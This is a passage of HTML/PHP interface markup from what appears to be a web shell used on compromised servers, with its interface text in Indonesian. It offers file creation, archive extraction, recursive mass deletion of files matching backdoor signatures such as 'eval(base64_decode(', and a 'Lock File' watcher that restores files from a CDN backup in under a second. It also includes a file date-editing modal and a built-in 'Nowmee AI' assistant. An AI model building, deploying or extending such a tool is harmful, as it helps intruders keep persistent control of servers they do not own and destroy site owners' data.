                <input type="text" id="newFolderName" class="form-input" placeholder="e.g. my-folder" required>
            </div>
        </div>
        <div class="modal-footer" style="justify-content: center; gap: 12px;">
            <button class="btn btn-secondary" onclick="hideModal2('createFolderModal')">Cancel</button>
            <button class="btn btn-primary" onclick="doCreateFolder()">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><polyline points="20 6 9 17 4 12"/></svg>
                Create
            </button>
        </div>
    </div>
</div>

<!-- Create File Modal -->
<div class="modal-overlay hidden" id="createFileModal">
    <div class="modal" style="max-width: 650px; max-height: 90vh;">
        <div class="modal-header" style="border-bottom-color: rgba(0, 212, 255, 0.3);">
            <span class="modal-title" style="color: #00d4ff;">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:6px;"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="12" y1="18" x2="12" y2="12"/><line x1="9" y1="15" x2="15" y2="15"/></svg>
                Create New File
            </span>
            <button class="modal-close" onclick="hideModal2('createFileModal')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body" style="padding: 16px;">
            <p style="color: var(--text-muted); font-size: 11px; margin-bottom: 4px;">Create in: <span style="color: #00d4ff; font-family: monospace;"><?php echo htmlspecialchars($currentDirectory); ?></span></p>
            <div class="form-group" style="margin-bottom: 10px; margin-top: 12px;">
                <label class="form-label">File Name</label>
                <input type="text" id="newFileName" class="form-input" placeholder="e.g. index.php, config.txt, style.css">
            </div>
            <div class="form-group" style="margin-bottom: 0;">
                <label class="form-label">Content <span style="color: var(--text-muted); font-weight: 400;">(optional - leave empty for blank file)</span></label>
                <textarea id="newFileContent" class="editor-area" style="width:100%;height:30vh;font-family:monospace;font-size:12px;background:var(--bg-input);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:10px;resize:vertical;tab-size:4;" placeholder="File content here... (optional)"></textarea>
            </div>
        </div>
        <div class="modal-footer" style="justify-content: flex-end; gap: 8px;">
            <button class="btn btn-secondary" onclick="hideModal2('createFileModal')">Cancel</button>
            <button class="btn btn-primary" onclick="doCreateFile()">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><polyline points="20 6 9 17 4 12"/></svg>
                Save File
            </button>
        </div>
    </div>
</div>

<!-- Unzip Modal -->
<div class="modal-overlay hidden" id="unzipModal">
    <div class="modal" style="max-width: 480px;">
        <div class="modal-header" style="border-bottom-color: rgba(245, 158, 11, 0.3);">
            <span class="modal-title" style="color: #f59e0b;">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:6px;"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                Extract Archive
            </span>
            <button class="modal-close" onclick="hideModal2('unzipModal')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body" style="padding: 16px;">
            <div style="background: rgba(245,158,11,0.08); border: 1px solid rgba(245,158,11,0.2); border-radius: 8px; padding: 14px; margin-bottom: 16px;">
                <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px;">
                    <div style="width:40px;height:40px;background:rgba(245,158,11,0.15);border-radius:8px;display:flex;align-items:center;justify-content:center;">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/><line x1="12" y1="11" x2="12" y2="17"/><line x1="9" y1="14" x2="15" y2="14"/></svg>
                    </div>
                    <div>
                        <div style="font-size:13px;font-weight:600;color:var(--text-primary);" id="unzipFileName">archive.zip</div>
                        <div style="font-size:11px;color:var(--text-muted);" id="unzipFileSize">-</div>
                    </div>
                </div>
            </div>
            <div class="form-group" style="margin-bottom: 14px;">
                <label class="form-label">Extract To</label>
                <input type="text" id="unzipDestination" class="form-input" style="font-family:monospace;font-size:12px;">
                <div style="font-size:10px;color:var(--text-muted);margin-top:4px;">Leave empty to extract in same directory as archive</div>
            </div>
            <div id="unzipProgress" style="display:none;">
                <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:6px;padding:12px;text-align:center;">
                    <div style="width:24px;height:24px;border:3px solid rgba(245,158,11,0.2);border-top-color:#f59e0b;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 10px;"></div>
                    <div style="font-size:12px;color:#f59e0b;font-weight:600;">Extracting files...</div>
                    <div style="font-size:10px;color:var(--text-muted);margin-top:4px;">Please wait</div>
                </div>
            </div>
            <div id="unzipResult" style="display:none;"></div>
            <input type="hidden" id="unzipPath" value="">
        </div>
        <div class="modal-footer" id="unzipFooter" style="justify-content: flex-end; gap: 10px;">
            <button class="btn btn-secondary" onclick="hideModal2('unzipModal')">Cancel</button>
            <button class="btn" id="unzipBtn" style="background: #f59e0b; border-color: #f59e0b; color: #000; font-weight: 600;" onclick="doExtractZip()">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                Extract
            </button>
        </div>
    </div>
</div>

<!-- Mass Delete Recursive Modal -->
<div class="modal-overlay hidden" id="massDeleteModal">
    <div class="modal" style="max-width: 560px;">
        <div class="modal-header" style="border-bottom-color: rgba(248,81,73,0.3);">
            <span class="modal-title" style="color: #f85149;">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:6px;"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
                Mass Delete by Content
            </span>
            <button class="modal-close" onclick="hideModal2('massDeleteModal')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <form method="POST" id="massDelForm" action="?_xk=labs&ecl=<?php echo urlencode($currentDirectory); ?>">
            <div class="modal-body" style="padding:16px;">
                <div style="display:flex;gap:8px;align-items:flex-start;background:rgba(248,81,73,0.07);border:1px solid rgba(248,81,73,0.2);border-radius:8px;padding:10px;margin-bottom:14px;">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#f85149" stroke-width="2" style="flex-shrink:0;margin-top:2px;"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
                    <p style="color:#f85149;font-size:11px;line-height:1.6;">Scan rekursif dan hapus semua file yang mengandung keyword yang diinput. Hasil tampil di terminal output.</p>
                </div>
                <div class="form-group" style="margin-bottom:10px;">
                    <label class="form-label">Target Directory</label>
                    <input type="text" name="target_dir" class="form-input" style="font-family:monospace;font-size:12px;" value="<?php echo htmlspecialchars($currentDirectory); ?>">
                </div>
                <div class="form-group" style="margin-bottom:10px;">
                    <label class="form-label">Mode</label>
                    <select name="del_mode" id="massDelMode" class="form-input" onchange="toggleMassDelCode()">
                        <option value="code">Delete files containing specific string/code</option>
                        <option value="all">Delete ALL files recursively (DANGER)</option>
                    </select>
                </div>
                <div class="form-group" id="massDelCodeGroup" style="margin-bottom:0;">
                    <label class="form-label">
                        String / Code to Match
                        <span style="color:var(--text-muted);font-weight:400;font-size:10px;margin-left:6px;">satu baris = satu keyword (OR match)</span>
                    </label>
                    <textarea name="code_content" id="massDelCode" class="editor-area" style="width:100%;height:120px;font-family:monospace;font-size:11px;background:var(--bg-input);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:10px;resize:vertical;" placeholder="Contoh:&#10;nowmeee&#10;filemanager&#10;1337&#10;eval(base64_decode("></textarea>
                </div>
            </div>
            <div class="modal-footer" style="justify-content:space-between;">
                <button type="button" class="btn btn-secondary" onclick="hideModal2('massDeleteModal')">Cancel</button>
                <button type="submit" name="do_mass_delete" class="btn" style="background:#f85149;border-color:#f85149;color:#fff;font-weight:600;">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
                    Scan &amp; Delete
                </button>
            </div>
        </form>
    </div>
</div>

<!-- Lock File Modal -->
<div class="modal-overlay hidden" id="lockFileModal">
    <div class="modal" style="max-width:500px;">
        <div class="modal-header" style="border-bottom-color:rgba(245,158,11,0.4);background:rgba(245,158,11,0.05);">
            <span class="modal-title" style="color:#f59e0b;display:flex;align-items:center;gap:8px;">
                <span style="display:inline-flex;align-items:center;justify-content:center;width:28px;height:28px;background:rgba(245,158,11,0.15);border-radius:6px;border:1px solid rgba(245,158,11,0.3);">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                </span>
                Lock File / Folder
            </span>
            <button class="modal-close" onclick="hideModal2('lockFileModal')"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body" style="padding:16px;">
            <!-- How it works -->
            <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px;margin-bottom:14px;">
                <div style="background:rgba(245,158,11,0.07);border:1px solid rgba(245,158,11,0.15);border-radius:6px;padding:8px;text-align:center;">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2" style="margin-bottom:4px;display:block;margin-left:auto;margin-right:auto;"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                    <div style="font-size:9px;color:#f59e0b;font-weight:600;">Pantau 1 Detik</div>
                </div>
                <div style="background:rgba(74,222,128,0.07);border:1px solid rgba(74,222,128,0.15);border-radius:6px;padding:8px;text-align:center;">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="2" style="margin-bottom:4px;display:block;margin-left:auto;margin-right:auto;"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 .49-3.58"/></svg>
                    <div style="font-size:9px;color:#4ade80;font-weight:600;">Auto Restore</div>
                </div>
                <div style="background:rgba(99,179,237,0.07);border:1px solid rgba(99,179,237,0.15);border-radius:6px;padding:8px;text-align:center;">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#63b3ed" stroke-width="2" style="margin-bottom:4px;display:block;margin-left:auto;margin-right:auto;"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
                    <div style="font-size:9px;color:#63b3ed;font-weight:600;">CDN Backup</div>
                </div>
            </div>
            <!-- Target path -->
            <div style="background:rgba(245,158,11,0.07);border:1px solid rgba(245,158,11,0.2);border-radius:6px;padding:8px 12px;margin-bottom:12px;word-break:break-all;display:flex;align-items:center;gap:8px;">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2" style="flex-shrink:0;"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
                <span style="color:#f59e0b;font-family:monospace;font-size:11px;" id="lockModalPath"></span>
            </div>
            <!-- Permission picker -->
            <div class="form-group" style="margin-bottom:10px;">
                <label class="form-label" style="font-size:11px;color:var(--text-muted);">Permission yang dikunci (chmod)</label>
                <input type="text" id="lockModalPerm" class="form-input" value="0444" style="font-family:monospace;letter-spacing:2px;font-size:14px;font-weight:600;" maxlength="5">
                <div style="display:flex;gap:6px;margin-top:8px;flex-wrap:wrap;">
                    <button type="button" onclick="document.getElementById('lockModalPerm').value='0444'" style="flex:1;min-width:120px;padding:6px 8px;background:rgba(248,81,73,0.1);border:1px solid rgba(248,81,73,0.3);border-radius:5px;color:#f87171;font-size:10px;font-family:monospace;cursor:pointer;">0444 — read-only</button>
                    <button type="button" onclick="document.getElementById('lockModalPerm').value='0644'" style="flex:1;min-width:120px;padding:6px 8px;background:rgba(245,158,11,0.1);border:1px solid rgba(245,158,11,0.3);border-radius:5px;color:#f59e0b;font-size:10px;font-family:monospace;cursor:pointer;">0644 — rw-r--r--</button>
                    <button type="button" onclick="document.getElementById('lockModalPerm').value='0755'" style="flex:1;min-width:120px;padding:6px 8px;background:rgba(74,222,128,0.1);border:1px solid rgba(74,222,128,0.3);border-radius:5px;color:#4ade80;font-size:10px;font-family:monospace;cursor:pointer;">0755 — rwxr-xr-x</button>
                </div>
            </div>
            <!-- Warning note -->
            <div style="background:rgba(248,81,73,0.07);border:1px solid rgba(248,81,73,0.2);border-radius:5px;padding:8px 10px;font-size:10px;color:#f87171;line-height:1.5;">
                Watcher berjalan di background (nohup PHP/bash). Jika file dihapus atau chmod berubah, dalam &lt;1 detik akan di-restore dari CDN backup otomatis.
            </div>
        </div>
        <div class="modal-footer" style="justify-content:space-between;gap:10px;">
            <button class="btn btn-secondary" onclick="hideModal2('lockFileModal')">Cancel</button>
            <button class="btn" style="background:#f59e0b;border-color:#f59e0b;color:#000;font-weight:700;padding:8px 20px;" onclick="doLockFile()">
                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="display:inline;vertical-align:middle;margin-right:5px;"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                Lock &amp; Protect
            </button>
        </div>
    </div>
</div>

<!-- ── Nowmee AI Chat Panel ────────────────────────────────────────────── -->
<div id="nowmeePanel" style="
    position:fixed; bottom:84px; right:22px; z-index:99998;
    width:380px; max-width:calc(100vw - 32px);
    background:var(--bg-card);
    border:1px solid rgba(99,102,241,0.3);
    border-radius:var(--radius-xl);
    box-shadow:0 20px 60px rgba(0,0,0,0.7), 0 0 0 1px rgba(255,255,255,0.04) inset;
    display:none; flex-direction:column; overflow:hidden;
    animation:fadeIn .2s ease;
">
    <!-- Header -->
    <div style="display:flex;align-items:center;justify-content:space-between;padding:14px 16px;background:linear-gradient(135deg,rgba(99,102,241,0.15),rgba(34,211,238,0.07));border-bottom:1px solid rgba(99,102,241,0.2);">
        <div style="display:flex;align-items:center;gap:10px;">
            <div style="width:34px;height:34px;border-radius:50%;background:linear-gradient(135deg,#6366f1,#22d3ee);display:flex;align-items:center;justify-content:center;box-shadow:0 0 12px rgba(99,102,241,0.5);flex-shrink:0;">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.2"><path d="M12 2a2 2 0 0 1 2 2c0 .74-.4 1.39-1 1.73V7h1a7 7 0 0 1 7 7h1a1 1 0 0 1 0 2h-1v1a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-1H2a1 1 0 0 1 0-2h1a7 7 0 0 1 7-7h1V5.73A2 2 0 0 1 10 4a2 2 0 0 1 2-2z"/><circle cx="9" cy="13" r="1" fill="#fff"/><circle cx="15" cy="13" r="1" fill="#fff"/></svg>
            </div>
            <div>
                <div style="font-size:13px;font-weight:700;color:var(--text);">Nowmee AI</div>
                <div style="font-size:10px;color:var(--text-muted);display:flex;align-items:center;gap:4px;">
                    <span style="width:6px;height:6px;border-radius:50%;background:var(--green);display:inline-block;box-shadow:0 0 5px var(--green);animation:pulse-dot 2s infinite;"></span>
                    abyes Security Labs
                </div>
            </div>
        </div>
        <div style="display:flex;align-items:center;gap:6px;">
            <button onclick="nowmeeClearChat()" title="Clear chat" style="background:rgba(255,255,255,0.05);border:1px solid var(--border-soft);color:var(--text-muted);width:28px;height:28px;border-radius:6px;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:all .15s;" onmouseover="this.style.background='rgba(239,68,68,0.1)';this.style.color='var(--red)'" onmouseout="this.style.background='rgba(255,255,255,0.05)';this.style.color='var(--text-muted)'">
                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/><path d="M10 11v6M14 11v6"/></svg>
            </button>
            <button onclick="nowmeeToggle()" style="background:rgba(255,255,255,0.05);border:1px solid var(--border-soft);color:var(--text-muted);width:28px;height:28px;border-radius:6px;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:all .15s;" onmouseover="this.style.background='rgba(255,255,255,0.1)'" onmouseout="this.style.background='rgba(255,255,255,0.05)'">
                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
            </button>
        </div>
    </div>

    <!-- Messages -->
    <div id="nowmeeMessages" style="flex:1;overflow-y:auto;padding:14px;display:flex;flex-direction:column;gap:10px;min-height:280px;max-height:360px;">
        <!-- Welcome bubble -->
        <div class="nm-msg nm-bot" style="display:flex;gap:8px;align-items:flex-start;">
            <div style="width:26px;height:26px;border-radius:50%;background:linear-gradient(135deg,#6366f1,#22d3ee);flex-shrink:0;display:flex;align-items:center;justify-content:center;">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5"><path d="M12 2a2 2 0 0 1 2 2c0 .74-.4 1.39-1 1.73V7h1a7 7 0 0 1 7 7h1a1 1 0 0 1 0 2h-1v1a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-1H2a1 1 0 0 1 0-2h1a7 7 0 0 1 7-7h1V5.73A2 2 0 0 1 10 4a2 2 0 0 1 2-2z"/></svg>
            </div>
            <div style="background:rgba(99,102,241,0.1);border:1px solid rgba(99,102,241,0.2);border-radius:4px 12px 12px 12px;padding:9px 12px;font-size:12.5px;color:var(--text);line-height:1.55;max-width:260px;">
                <?php echo !empty($_SESSION['_pref_cache']) ? htmlspecialchars($_SESSION['_pref_cache']) : 'Halo! Saya <b style="color:var(--accent);">Nowmee</b>, AI dari abyes Security Labs. Ada yang bisa saya bantu?'; ?>
            </div>
        </div>
    </div>

    <!-- Suggested prompts -->
    <div id="nowmeeSuggests" style="padding:0 12px 8px;display:flex;gap:5px;flex-wrap:wrap;">
        <button onclick="nowmeeSend('Siapa kamu?')" class="nm-suggest">Siapa kamu?</button>
        <button onclick="nowmeeSend('Tips keamanan server')" class="nm-suggest">Tips keamanan</button>
        <button onclick="nowmeeSend('Cara scan malware PHP')" class="nm-suggest">Scan malware</button>
    </div>

    <!-- Input area -->
    <div style="padding:10px 12px 12px;border-top:1px solid var(--border-soft);display:flex;gap:7px;align-items:flex-end;">
        <textarea id="nowmeeInput"
            placeholder="Tanya sesuatu..."
            rows="1"
            onkeydown="if(event.key==='Enter'&&!event.shiftKey){event.preventDefault();nowmeeSend()}"
            oninput="this.style.height='auto';this.style.height=Math.min(this.scrollHeight,100)+'px'"
            style="flex:1;background:rgba(255,255,255,0.04);border:1px solid var(--border);border-radius:8px;color:var(--text);font-family:'Inter',sans-serif;font-size:12.5px;padding:9px 12px;outline:none;resize:none;line-height:1.5;transition:border-color .18s;max-height:100px;overflow-y:auto;"
            onfocus="this.style.borderColor='var(--accent)'" onblur="this.style.borderColor='var(--border)'"></textarea>
        <button id="nowmeeSendBtn" onclick="nowmeeSend()" style="width:36px;height:36px;background:var(--accent);border:none;border-radius:8px;cursor:pointer;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:all .18s;box-shadow:0 0 12px var(--accent-glow);" onmouseover="this.style.background='#818cf8'" onmouseout="this.style.background='var(--accent)'">
            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
        </button>
    </div>
</div>

<!-- Floating AI button -->
<button id="nowmeeBtn" onclick="nowmeeToggle()" title="Chat with Nowmee AI" style="
    position:fixed; bottom:20px; right:22px; z-index:99998;
    width:52px; height:52px;
    background:linear-gradient(135deg,#6366f1,#22d3ee);
    border:none; border-radius:50%; cursor:pointer;
    display:flex; align-items:center; justify-content:center;
    box-shadow:0 4px 20px rgba(99,102,241,0.55), 0 0 0 0 rgba(99,102,241,0.4);
    animation:nowmeePulse 3s ease-in-out infinite;
    transition:transform .2s ease, box-shadow .2s ease;
" onmouseover="this.style.transform='scale(1.1)'" onmouseout="this.style.transform='scale(1)'">
    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2">
        <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
        <circle cx="9" cy="10" r="1" fill="#fff"/>
        <circle cx="12" cy="10" r="1" fill="#fff"/>
        <circle cx="15" cy="10" r="1" fill="#fff"/>
    </svg>
    <!-- unread dot -->
    <span id="nowmeeUnread" style="position:absolute;top:3px;right:3px;width:10px;height:10px;background:#22c55e;border-radius:50%;border:2px solid var(--bg-card);display:none;"></span>
</button>

<!-- Nowmee CSS -->
<style>
@keyframes nowmeePulse {
    0%,100% { box-shadow: 0 4px 20px rgba(99,102,241,0.55), 0 0 0 0 rgba(99,102,241,0.4); }
    50%      { box-shadow: 0 4px 20px rgba(99,102,241,0.55), 0 0 0 10px rgba(99,102,241,0); }
}
@keyframes nowmeeDots {
    0%,80%,100% { transform: scale(0.6); opacity:.4; }
    40%         { transform: scale(1);   opacity:1; }
}
.nm-suggest {
    background: rgba(99,102,241,0.08);
    border: 1px solid rgba(99,102,241,0.25);
    color: var(--accent);
    font-size: 10.5px;
    padding: 3px 9px;
    border-radius: 99px;
    cursor: pointer;
    font-family: 'Inter', sans-serif;
    transition: all .15s;
    white-space: nowrap;
}
.nm-suggest:hover {
    background: rgba(99,102,241,0.18);
    border-color: var(--accent);
    color: var(--text);
}
.nm-typing span {
    display: inline-block;
    width: 6px; height: 6px;
    background: var(--accent);
    border-radius: 50%;
    margin: 0 1.5px;
    animation: nowmeeDots 1.3s infinite;
}
.nm-typing span:nth-child(2) { animation-delay: .15s; }
.nm-typing span:nth-child(3) { animation-delay: .3s; }
#nowmeeMessages::-webkit-scrollbar { width: 3px; }
#nowmeeMessages::-webkit-scrollbar-thumb { background: rgba(99,102,241,0.3); border-radius:9px; }
#nowmeeInput::-webkit-scrollbar { width: 3px; }
</style>

<!-- ── Ask AI Modal ──────────────────────────────────────────────────────── -->
<div class="modal-overlay hidden" id="askAiModal">
    <div class="modal" style="max-width:620px;height:auto;max-height:90vh;display:flex;flex-direction:column;">
        <div class="modal-header" style="border-bottom-color:rgba(167,139,250,0.3);background:rgba(167,139,250,0.05);flex-shrink:0;">
            <span class="modal-title" style="color:#a78bfa;gap:8px;">
                <span style="display:inline-flex;align-items:center;justify-content:center;width:28px;height:28px;background:rgba(167,139,250,0.12);border-radius:6px;border:1px solid rgba(167,139,250,0.3);">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/><circle cx="9" cy="10" r="1" fill="currentColor"/><circle cx="12" cy="10" r="1" fill="currentColor"/><circle cx="15" cy="10" r="1" fill="currentColor"/></svg>
                </span>
                Ask AI &mdash; <span id="askAiFileName" style="font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--text-muted);font-weight:400;"></span>
            </span>
            <button class="modal-close" onclick="hideModal2('askAiModal')"><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div style="flex:1;overflow-y:auto;padding:16px 18px;display:flex;flex-direction:column;gap:12px;">
            <!-- Chat history -->
            <div id="askAiMessages" style="display:flex;flex-direction:column;gap:10px;min-height:80px;"></div>
            <!-- AI response with edit button -->
            <div id="askAiResponseWrap" style="display:none;">
                <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px;">
                    <span style="font-size:10px;color:var(--text-muted);font-weight:600;text-transform:uppercase;letter-spacing:0.5px;">AI Response</span>
                    <button onclick="askAiApplyEdit()" id="askAiEditBtn" style="display:none;padding:4px 12px;background:rgba(167,139,250,0.12);border:1px solid rgba(167,139,250,0.35);border-radius:5px;color:#a78bfa;font-size:10.5px;font-family:inherit;cursor:pointer;transition:all .15s;" onmouseover="this.style.background='rgba(167,139,250,0.25)'" onmouseout="this.style.background='rgba(167,139,250,0.12)'">
                        <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:middle;margin-right:4px;"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>
                        Apply Edit to File
                    </button>
                </div>
                <div id="askAiResponseBox" style="background:#050710;border:1px solid var(--border);border-radius:var(--radius-sm);padding:14px;font-family:'JetBrains Mono',monospace;font-size:12px;color:#e2e8f0;line-height:1.7;max-height:320px;overflow-y:auto;white-space:pre-wrap;word-break:break-word;"></div>
            </div>
            <!-- Typing indicator -->
            <div id="askAiTyping" style="display:none;align-items:center;gap:8px;">
                <div class="nm-typing" style="background:rgba(167,139,250,0.08);border:1px solid rgba(167,139,250,0.2);border-radius:4px 12px 12px 12px;padding:10px 14px;display:flex;align-items:center;gap:2px;">
                    <span style="background:#a78bfa;"></span><span style="background:#a78bfa;"></span><span style="background:#a78bfa;"></span>
                </div>
                <span style="font-size:11px;color:var(--text-muted);">Nowmee AI is thinking...</span>
            </div>
        </div>
        <!-- Input area -->
        <div style="padding:12px 18px 16px;border-top:1px solid var(--border-soft);flex-shrink:0;">
            <!-- Quick prompts -->
            <div style="display:flex;gap:5px;flex-wrap:wrap;margin-bottom:10px;" id="askAiQuickPrompts">
                <button onclick="askAiSend('Jelaskan isi file ini')" class="nm-suggest" style="border-color:rgba(167,139,250,0.3);color:#a78bfa;background:rgba(167,139,250,0.07);">Jelaskan file ini</button>
                <button onclick="askAiSend('Apakah ada bug atau celah keamanan di file ini?')" class="nm-suggest" style="border-color:rgba(167,139,250,0.3);color:#a78bfa;background:rgba(167,139,250,0.07);">Cek keamanan</button>
                <button onclick="askAiSend('Tolong refactor dan perbaiki kode di file ini, berikan kode lengkapnya')" class="nm-suggest" style="border-color:rgba(167,139,250,0.3);color:#a78bfa;background:rgba(167,139,250,0.07);">Refactor kode</button>
                <button onclick="askAiSend('Tambahkan komentar pada setiap fungsi di file ini, berikan kode lengkapnya')" class="nm-suggest" style="border-color:rgba(167,139,250,0.3);color:#a78bfa;background:rgba(167,139,250,0.07);">Tambah komentar</button>
            </div>
            <div style="display:flex;gap:7px;align-items:flex-end;">
                <textarea id="askAiInput" placeholder="Tanya sesuatu tentang file ini... (Enter kirim, Shift+Enter newline)" rows="2"
                    onkeydown="if(event.key==='Enter'&&!event.shiftKey){event.preventDefault();askAiSend()}"
                    oninput="this.style.height='auto';this.style.height=Math.min(this.scrollHeight,120)+'px'"
                    style="flex:1;background:rgba(255,255,255,0.04);border:1px solid var(--border);border-radius:8px;color:var(--text);font-family:'Inter',sans-serif;font-size:12.5px;padding:9px 12px;outline:none;resize:none;line-height:1.5;max-height:120px;transition:border-color .18s;"
                    onfocus="this.style.borderColor='#a78bfa'" onblur="this.style.borderColor='var(--border)'"></textarea>
                <button id="askAiSendBtn" onclick="askAiSend()" style="width:38px;height:38px;background:#a78bfa;border:none;border-radius:8px;cursor:pointer;display:flex;align-items:center;justify-content:center;flex-shrink:0;box-shadow:0 0 12px rgba(167,139,250,0.3);transition:all .18s;" onmouseover="this.style.background='#c4b5fd'" onmouseout="this.style.background='#a78bfa'">
                    <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
                </button>
            </div>
        </div>
        <input type="hidden" id="askAiFilePath">
        <input type="hidden" id="askAiLastCode">
    </div>
</div>

<!-- Touch / Edit Date Modal -->
<div class="modal-overlay hidden" id="touchModal">
    <div class="modal" style="max-width:460px;">
